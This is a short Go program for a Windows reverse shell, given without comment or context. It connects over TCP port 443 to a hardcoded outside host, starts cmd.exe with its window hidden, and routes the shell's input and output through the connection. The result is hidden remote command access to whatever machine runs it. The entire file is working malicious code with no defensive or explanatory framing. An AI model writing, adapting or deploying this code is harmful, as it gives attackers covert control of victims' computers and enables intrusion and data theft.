package main

import (
	"net"
	"os"
	"os/exec"
	"syscall"
)

var connectString = "bagheera.zyston.com:443"

func main() {
	if len(connectString) == 0 {
		os.Exit(1)
	}

	conn, err := net.Dial("tcp", connectString)
	if err != nil {
		os.Exit(1)
	}

	cmd := exec.Command("cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	cmd.Run()
}
